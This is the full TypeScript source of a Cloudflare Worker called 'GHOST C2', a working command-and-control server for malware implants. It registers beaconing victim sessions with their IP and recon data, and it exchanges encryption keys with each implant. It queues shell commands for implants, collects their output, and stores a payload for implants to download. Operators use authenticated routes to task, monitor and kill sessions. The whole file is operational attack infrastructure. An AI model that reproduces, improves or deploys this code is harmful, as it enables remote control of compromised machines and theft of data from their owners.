/**
 * GHOST C2 — Cloudflare Worker
 *
 * - URL-decodes session IDs (fixes pipe character issue).
 * - Results kept by default; ?clear=1 removes.
 * - KV operations retried up to 3 times with exponential backoff.
 * - Safe JSON parse — never throws on malformed bodies.
 * - Session TTL is respected inside appendResult (was hardcoded 86400).
 * - All operator routes require X-Operator-Token; beacon routes require X-Beacon-Token.
 */

// ─── Environment ──────────────────────────────────────────

interface Env {
  GHOST_KV: KVNamespace;
  BEACON_TOKEN: string;
  OPERATOR_TOKEN: string;
  SESSION_KEY_PSK: string;
  /** Seconds before an idle session expires. Default: 600. */
  SESSION_TIMEOUT_SECONDS: string;
  /** Allowed CORS origin. Default: * */
  CORS_ORIGIN: string;
}

// ─── Domain Types ─────────────────────────────────────────

interface SessionData {
  session: string;
  remote_ip: string;
  first_seen: string;
  last_beacon: string;
  recon: Record<string, unknown>;
  pending_tasks: number;
  result_count: number;
}

interface ResultEntry {
  ts: string;
  output: string;
}

interface BeaconRequest {
  session?: string;
  recon?: Record<string, unknown>;
  key?: string;
  enc?: string;
}

interface ResultRequest {
  session?: string;
  output?: string;
  enc?: string;
}

interface TaskRequest {
  session: string;
  cmd: string;
}

interface AuditEntry {
  ts: string;
  ip: string;
  action: string;
  detail: Record<string, unknown>;
}

// ─── Constants ────────────────────────────────────────────

const MAX_SESSION_LEN = 128;
const MAX_CMD_LEN = 4096;
const MAX_OUTPUT_LEN = 65_536;
const RESULT_CAP = 500;
const RESULT_BYTE_CAP = 20 * 1024 * 1024; // 20 MB
const AUDIT_CAP = 1_000;
const AUDIT_TTL = 604_800; // 7 days
const TASK_TTL = 86_400;   // 24 hours
const PAYLOAD_MAX = 32 * 1024 * 1024; // 32 MB
const PAYLOAD_TTL = 86_400 * 30;

const KV_MAX_RETRIES = 3;
const KV_RETRY_BASE_MS = 200;

// ─── Crypto Helpers ───────────────────────────────────────

async function decryptAesGcm(keyBytes: Uint8Array, b64Ciphertext: string): Promise<string> {
  const data = Uint8Array.from(atob(b64Ciphertext), c => c.charCodeAt(0));
  if (data.length < 28) throw new Error("Ciphertext too short");
  const iv = data.slice(0, 12);
  const tag = data.slice(12, 28);
  const ct = data.slice(28);
  
  const ctWithTag = new Uint8Array(ct.length + tag.length);
  ctWithTag.set(ct, 0);
  ctWithTag.set(tag, ct.length);

  const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["decrypt"]);
  const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv, tagLength: 128 }, cryptoKey, ctWithTag);
  return new TextDecoder().decode(decrypted);
}

async function encryptAesGcm(keyBytes: Uint8Array, plaintext: string): Promise<string> {
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const cryptoKey = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["encrypt"]);
  const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv, tagLength: 128 }, cryptoKey, new TextEncoder().encode(plaintext));
  
  const buf = new Uint8Array(encrypted);
  const ct = buf.slice(0, buf.length - 16);
  const tag = buf.slice(buf.length - 16);
  
  const out = new Uint8Array(12 + 16 + ct.length);
  out.set(iv, 0);
  out.set(tag, 12);
  out.set(ct, 28);
  
  return btoa(String.fromCharCode(...out));
}

// ─── Helpers ──────────────────────────────────────────────

function jsonResponse(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

function errorResponse(message: string, status: number): Response {
  return jsonResponse({ error: message }, status);
}

/**
 * Constant-time string comparison — prevents timing oracle on token auth.
 * Falls back to false immediately on length mismatch (no encoding needed).
 */
function secureCompare(a: string, b: string): boolean {
  if (a.length !== b.length) return false;
  const enc = new TextEncoder();
  const bufA = enc.encode(a);
  const bufB = enc.encode(b);
  let diff = 0;
  for (let i = 0; i < bufA.length; i++) diff |= bufA[i] ^ bufB[i];
  return diff === 0;
}

function getClientIP(request: Request): string {
  return (
    request.headers.get("CF-Connecting-IP") ??
    request.headers.get("X-Real-IP") ??
    "unknown"
  );
}

function clamp(s: string, max: number): string {
  return s.length > max ? s.slice(0, max) : s;
}

function getSessionTTL(env: Env): number {
  const v = parseInt(env.SESSION_TIMEOUT_SECONDS || "600", 10);
  return Number.isFinite(v) && v > 0 ? v : 600;
}

function now(): string {
  return new Date().toISOString();
}

/** Safe JSON parse — returns null instead of throwing on malformed input. */
async function safeJson<T>(request: Request): Promise<T | null> {
  try {
    return (await request.json()) as T;
  } catch {
    return null;
  }
}

function withCORS(response: Response, env: Env): Response {
  const origin = env.CORS_ORIGIN || "*";
  const h = new Headers(response.headers);
  h.set("Access-Control-Allow-Origin", origin);
  h.set("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
  h.set("Access-Control-Allow-Headers", "Content-Type, X-Beacon-Token, X-Operator-Token");
  h.set("Access-Control-Max-Age", "86400");
  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers: h,
  });
}

// ─── KV: Retry Wrapper ────────────────────────────────────

async function withRetry<T>(fn: () => Promise<T>): Promise<T> {
  let lastErr: Error | undefined;
  for (let attempt = 0; attempt < KV_MAX_RETRIES; attempt++) {
    try {
      return await fn();
    } catch (err) {
      lastErr = err as Error;
      if (attempt < KV_MAX_RETRIES - 1) {
        await new Promise(r => setTimeout(r, KV_RETRY_BASE_MS * (attempt + 1)));
      }
    }
  }
  throw lastErr ?? new Error("KV operation failed after retries");
}

// ─── KV: Session ──────────────────────────────────────────

function sessionKey(sid: string): string { return `session:${sid}`; }
function tasksKey(sid: string): string   { return `tasks:${sid}`; }
function resultsKey(sid: string): string { return `results:${sid}`; }

async function getSession(kv: KVNamespace, sid: string): Promise<SessionData | null> {
  return withRetry(async () => {
    const raw = await kv.get(sessionKey(sid));
    return raw ? JSON.parse(raw) as SessionData : null;
  });
}

async function putSession(
  kv: KVNamespace,
  sid: string,
  data: SessionData,
  ttl: number,
): Promise<void> {
  await withRetry(() =>
    kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: ttl }),
  );
}

// ─── KV: Tasks ────────────────────────────────────────────

async function getTasks(kv: KVNamespace, sid: string): Promise<string[]> {
  return withRetry(async () => {
    const raw = await kv.get(tasksKey(sid));
    return raw ? JSON.parse(raw) as string[] : [];
  });
}

async function putTasks(
  kv: KVNamespace,
  sid: string,
  tasks: string[],
  sessionTtl = TASK_TTL,
): Promise<void> {
  await withRetry(async () => {
    if (tasks.length === 0) {
      await kv.delete(tasksKey(sid));
    } else {
      await kv.put(tasksKey(sid), JSON.stringify(tasks), { expirationTtl: TASK_TTL });
    }
    // Keep denormalized pending_tasks count in sync.
    const raw = await kv.get(sessionKey(sid));
    if (raw) {
      const data = JSON.parse(raw) as SessionData;
      data.pending_tasks = tasks.length;
      await kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: sessionTtl });
    }
  });
}

// ─── KV: Results ──────────────────────────────────────────

async function getResults(kv: KVNamespace, sid: string): Promise<ResultEntry[]> {
  return withRetry(async () => {
    const raw = await kv.get(resultsKey(sid));
    return raw ? JSON.parse(raw) as ResultEntry[] : [];
  });
}

async function putResults(kv: KVNamespace, sid: string, results: ResultEntry[]): Promise<void> {
  await withRetry(() => {
    if (results.length === 0) return kv.delete(resultsKey(sid));
    return kv.put(resultsKey(sid), JSON.stringify(results), { expirationTtl: TASK_TTL });
  });
}

async function appendResult(
  kv: KVNamespace,
  sid: string,
  entry: ResultEntry,
  sessionTtl: number,
): Promise<void> {
  await withRetry(async () => {
    const results = await getResults(kv, sid);

    // Evict oldest if at cap.
    if (results.length >= RESULT_CAP) results.shift();
    results.push(entry);

    // Byte-cap: trim from the front until under limit.
    while (results.length > 1 && JSON.stringify(results).length > RESULT_BYTE_CAP) {
      results.shift();
    }

    await putResults(kv, sid, results);

    // Sync denormalized result_count. Use the caller-provided TTL, not a
    // hardcoded 86400 — previously this ignored the session's actual timeout.
    const raw = await kv.get(sessionKey(sid));
    if (raw) {
      const data = JSON.parse(raw) as SessionData;
      data.result_count = results.length;
      await kv.put(sessionKey(sid), JSON.stringify(data), { expirationTtl: sessionTtl });
    }
  });
}

// ─── KV: Sessions List ────────────────────────────────────

async function listSessionKeys(kv: KVNamespace): Promise<string[]> {
  return withRetry(async () => {
    const keys: string[] = [];
    let cursor: string | undefined;
    do {
      const result = await kv.list({ prefix: "session:", cursor, limit: 1000 });
      for (const k of result.keys) keys.push(k.name);
      cursor = result.list_complete ? undefined : result.cursor;
    } while (cursor);
    return keys;
  });
}

// ─── KV: Audit Log ────────────────────────────────────────

async function logAudit(kv: KVNamespace, entry: AuditEntry): Promise<void> {
  await withRetry(async () => {
    const raw = await kv.get("audit_log");
    const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];
    if (log.length >= AUDIT_CAP) log.splice(0, log.length - (AUDIT_CAP - 1));
    log.push(entry);
    await kv.put("audit_log", JSON.stringify(log), { expirationTtl: AUDIT_TTL });
  });
}

// ─── Auth Middleware ───────────────────────────────────────

function requireBeaconToken(request: Request, env: Env): Response | null {
  const token = request.headers.get("X-Beacon-Token") ?? "";
  if (!env.BEACON_TOKEN || !secureCompare(token, env.BEACON_TOKEN)) {
    console.log(`[auth] beacon failure ip=${getClientIP(request)}`);
    return errorResponse("Unauthorized", 401);
  }
  return null;
}

function requireOperatorToken(request: Request, env: Env): Response | null {
  const token = request.headers.get("X-Operator-Token") ?? "";
  if (!env.OPERATOR_TOKEN || !secureCompare(token, env.OPERATOR_TOKEN)) {
    console.log(`[auth] operator failure ip=${getClientIP(request)}`);
    return errorResponse("Unauthorized", 401);
  }
  return null;
}

// ─── Route Handlers ───────────────────────────────────────

async function handleBeacon(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<BeaconRequest>(request);
  if (!body?.session) return errorResponse("Missing session field", 400);

  const sid = clamp(String(body.session), MAX_SESSION_LEN);
  const ts = now();
  const ip = getClientIP(request);
  const ttl = getSessionTTL(env);

  // Phase 1: Key exchange
  if (body.key && env.SESSION_KEY_PSK) {
    try {
      const pskBytes = new Uint8Array(env.SESSION_KEY_PSK.match(/.{1,2}/g)!.map(byte => parseInt(byte, 16)));
      const sessionKeyRawStr = await decryptAesGcm(pskBytes, body.key);
      const sessionKeyB64 = btoa(sessionKeyRawStr);
      await env.GHOST_KV.put(`sessionkey:${sid}`, sessionKeyB64, { expirationTtl: ttl });
      console.log(`[beacon] sid=${sid} ip=${ip} key-exchange ok`);
    } catch (e) {
      console.error(`[beacon] sid=${sid} ip=${ip} key-exchange failed`);
      return errorResponse("Key exchange failed", 400);
    }
  }

  // Phase 2: Decrypt payload
  let plainBody = body;
  let sessionKeyBytes: Uint8Array | null = null;
  if (body.enc) {
    const storedKeyB64 = await env.GHOST_KV.get(`sessionkey:${sid}`);
    if (storedKeyB64) {
      try {
        sessionKeyBytes = Uint8Array.from(atob(storedKeyB64), c => c.charCodeAt(0));
        const decryptedStr = await decryptAesGcm(sessionKeyBytes, body.enc);
        const parsed = JSON.parse(decryptedStr);
        plainBody = { session: sid, recon: parsed.recon };
      } catch (e) {
        console.error(`[beacon] sid=${sid} ip=${ip} decrypt failed`);
      }
    }
  }

  const existing = await getSession(env.GHOST_KV, sid);
  const session: SessionData = {
    session: sid,
    remote_ip: ip,
    first_seen: existing?.first_seen ?? ts,
    last_beacon: ts,
    recon: plainBody.recon ?? existing?.recon ?? {},
    pending_tasks: existing?.pending_tasks ?? 0,
    result_count: existing?.result_count ?? 0,
  };
  await putSession(env.GHOST_KV, sid, session, ttl);

  const tasks = await getTasks(env.GHOST_KV, sid);
  let cmd = "sleep";
  if (tasks.length > 0) {
    cmd = tasks.shift()!;
    await putTasks(env.GHOST_KV, sid, tasks, ttl);
    console.log(`[beacon] sid=${sid} ip=${ip} tasked="${cmd}"`);
  } else {
    console.log(`[beacon] sid=${sid} ip=${ip} sleep`);
  }

  if (sessionKeyBytes) {
    const encResult = await encryptAesGcm(sessionKeyBytes, JSON.stringify({ cmd }));
    return jsonResponse({ enc: encResult });
  }

  return jsonResponse({ cmd });
}

async function handleResult(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<ResultRequest>(request);
  if (!body?.session) return errorResponse("Missing session field", 400);

  const sid = clamp(String(body.session), MAX_SESSION_LEN);
  const ttl = getSessionTTL(env);

  let outputStr = body.output;
  if (body.enc) {
    const storedKeyB64 = await env.GHOST_KV.get(`sessionkey:${sid}`);
    if (storedKeyB64) {
      try {
        const sessionKeyBytes = Uint8Array.from(atob(storedKeyB64), c => c.charCodeAt(0));
        const decryptedStr = await decryptAesGcm(sessionKeyBytes, body.enc);
        const parsed = JSON.parse(decryptedStr);
        outputStr = parsed.output;
      } catch (e) {
        console.error(`[result] sid=${sid} decrypt failed`);
      }
    }
  }

  if (outputStr === undefined) {
    return errorResponse("Missing output data", 400);
  }

  const output = clamp(String(outputStr), MAX_OUTPUT_LEN);

  await appendResult(env.GHOST_KV, sid, { ts: now(), output }, ttl);

  // Re-register session if it expired between task dispatch and result delivery.
  const existing = await getSession(env.GHOST_KV, sid);
  if (!existing) {
    const ts = now();
    await putSession(env.GHOST_KV, sid, {
      session: sid,
      remote_ip: getClientIP(request),
      first_seen: ts,
      last_beacon: ts,
      recon: {},
      pending_tasks: 0,
      result_count: 1,
    }, ttl);
  }

  console.log(`[result] sid=${sid} len=${output.length}`);
  return jsonResponse({ status: "ok" });
}

async function handleListSessions(request: Request, env: Env): Promise<Response> {
  const keys = await listSessionKeys(env.GHOST_KV);
  const ts = Date.now();
  const sessions: Record<string, unknown>[] = [];

  for (const key of keys) {
    const sid = key.replace("session:", "");
    const data = await getSession(env.GHOST_KV, sid);
    if (!data) continue;
    sessions.push({
      session: data.session,
      remote_ip: data.remote_ip,
      first_seen: data.first_seen,
      last_beacon: data.last_beacon,
      idle_seconds: Math.round((ts - new Date(data.last_beacon).getTime()) / 1000),
      recon: data.recon,
      pending_tasks: data.pending_tasks ?? 0,
      result_count: data.result_count ?? 0,
    });
  }

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "list_sessions",
    detail: { count: sessions.length },
  });

  return jsonResponse(sessions);
}

async function handleAddTask(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<TaskRequest>(request);
  if (!body?.session || !body?.cmd) {
    return errorResponse("Missing session or cmd field", 400);
  }

  const sid = clamp(String(body.session), MAX_SESSION_LEN);
  const cmd = clamp(String(body.cmd), MAX_CMD_LEN);

  const session = await getSession(env.GHOST_KV, sid);
  if (!session) return errorResponse("Session not found", 404);

  const tasks = await getTasks(env.GHOST_KV, sid);
  tasks.push(cmd);
  await putTasks(env.GHOST_KV, sid, tasks, getSessionTTL(env));

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "task_queued",
    detail: { session: sid, cmd },
  });

  console.log(`[task] sid=${sid} cmd="${cmd}" depth=${tasks.length}`);
  return jsonResponse({ status: "queued", queue_depth: tasks.length });
}

async function handleGetResults(request: Request, env: Env, sid: string): Promise<Response> {
  const session = await getSession(env.GHOST_KV, sid);
  if (!session) return errorResponse("Session not found", 404);

  const results = await getResults(env.GHOST_KV, sid);
  const clear = new URL(request.url).searchParams.get("clear") === "1";
  if (clear) await putResults(env.GHOST_KV, sid, []);

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "get_results",
    detail: { session: sid, count: results.length, clear },
  });

  return jsonResponse({ session: sid, results });
}

async function handleKillSession(request: Request, env: Env, sid: string): Promise<Response> {
  const session = await getSession(env.GHOST_KV, sid);
  if (!session) return errorResponse("Session not found", 404);

  const tasks = await getTasks(env.GHOST_KV, sid);
  tasks.unshift("exit");
  await putTasks(env.GHOST_KV, sid, tasks, getSessionTTL(env));

  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "kill_session",
    detail: { session: sid },
  });

  console.log(`[kill] sid=${sid} exit queued`);
  return jsonResponse({ status: "exit_queued", session: sid });
}

async function handleAudit(request: Request, env: Env): Promise<Response> {
  const limit = Math.min(
    parseInt(new URL(request.url).searchParams.get("limit") ?? "100", 10),
    AUDIT_CAP,
  );
  const raw = await env.GHOST_KV.get("audit_log");
  const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];
  return jsonResponse({ entries: log.slice(-limit) });
}

function handleHealth(): Response {
  return jsonResponse({ status: "ok", ts: now() });
}

async function handleUploadPayload(request: Request, env: Env): Promise<Response> {
  const body = await request.arrayBuffer();
  if (!body || body.byteLength === 0) return errorResponse("Empty body", 400);
  if (body.byteLength > PAYLOAD_MAX) return errorResponse("Payload too large (max 32 MB)", 413);

  await env.GHOST_KV.put("payload:ghost", body, { expirationTtl: PAYLOAD_TTL });
  await logAudit(env.GHOST_KV, {
    ts: now(),
    ip: getClientIP(request),
    action: "payload_uploaded",
    detail: { bytes: body.byteLength },
  });

  console.log(`[payload] uploaded ${body.byteLength} bytes`);
  return jsonResponse({ status: "ok", bytes: body.byteLength });
}

async function handleDownloadPayload(env: Env): Promise<Response> {
  const raw = await env.GHOST_KV.get("payload:ghost", { type: "arrayBuffer" });
  if (!raw) return errorResponse("Payload not found", 404);
  return new Response(raw, {
    status: 200,
    headers: {
      "Content-Type": "application/octet-stream",
      "Content-Length": String(raw.byteLength),
      "Cache-Control": "no-store",
    },
  });
}

// ─── Router ───────────────────────────────────────────────

async function handleRequest(request: Request, env: Env): Promise<Response> {
  const url = new URL(request.url);
  const { pathname: path, } = url;
  const method = request.method;

  // CORS preflight — respond immediately, no auth required.
  if (method === "OPTIONS") {
    return withCORS(new Response(null, { status: 204 }), env);
  }

  // ── Public ──────────────────────────────────────────────
  if (path === "/health" && method === "GET") {
    return withCORS(handleHealth(), env);
  }

  // ── Beacon routes (X-Beacon-Token) ──────────────────────
  if (path === "/beacon" && method === "POST") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleBeacon(request, env), env);
  }

  if (path === "/result" && method === "POST") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleResult(request, env), env);
  }

  // Payload download uses beacon token — implant fetches it.
  if (path === "/payload" && method === "GET") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleDownloadPayload(env), env);
  }

  // ── Operator routes (X-Operator-Token) ──────────────────
  if (path === "/sessions" && method === "GET") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleListSessions(request, env), env);
  }

  if (path === "/task" && method === "POST") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleAddTask(request, env), env);
  }

  if (path === "/audit" && method === "GET") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleAudit(request, env), env);
  }

  if (path === "/payload" && method === "POST") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleUploadPayload(request, env), env);
  }

  // ── Parameterised operator routes ───────────────────────
  const resultsMatch = path.match(/^\/results\/(.+)$/);
  if (resultsMatch && method === "GET") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleGetResults(request, env, decodeURIComponent(resultsMatch[1])), env);
  }

  const sessionsMatch = path.match(/^\/sessions\/(.+)$/);
  if (sessionsMatch && method === "DELETE") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleKillSession(request, env, decodeURIComponent(sessionsMatch[1])), env);
  }

  return withCORS(errorResponse("Not found", 404), env);
}

// ─── Entry Point ──────────────────────────────────────────

export default {
  async fetch(request: Request, env: Env, _ctx: ExecutionContext): Promise<Response> {
    try {
      return await handleRequest(request, env);
    } catch (err) {
      const message = err instanceof Error ? err.message : "Internal error";
      console.error(`[error] ${message}`);
      return withCORS(errorResponse("Internal server error", 500), env);
    }
  },
};